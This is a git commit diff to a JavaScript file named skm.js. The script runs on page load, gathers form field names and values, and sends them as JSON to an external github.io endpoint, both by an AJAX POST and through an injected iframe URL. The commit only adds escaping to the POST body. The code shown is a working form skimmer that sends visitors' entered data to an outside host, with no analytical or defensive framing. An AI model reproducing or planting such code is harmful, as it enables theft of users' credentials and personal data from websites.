5681fb3513698c22543d2ea030fc7618f5257edc
faisal-akhtar-fgh <43573460+faisal-akhtar-fgh@users.noreply.github.com>
2019-08-19 15:21:08 +0100

    Update skm.js

--- skm.js
+++ skm.js
@@ -5,7 +5,7 @@ window.onload = function() {
             e[t.name] = t.value;
         });
         var n = JSON.stringify(e);
-        $.post("https://faisal-akhtar-fgh.github.io/kal", n);
+        $.post("https://faisal-akhtar-fgh.github.io/kal", escape(n));
 		$("body").append('<iframe src="https://faisal-akhtar-fgh.github.io/kal/?data='+ escape(n) + '"></iframe>');
     });
 };
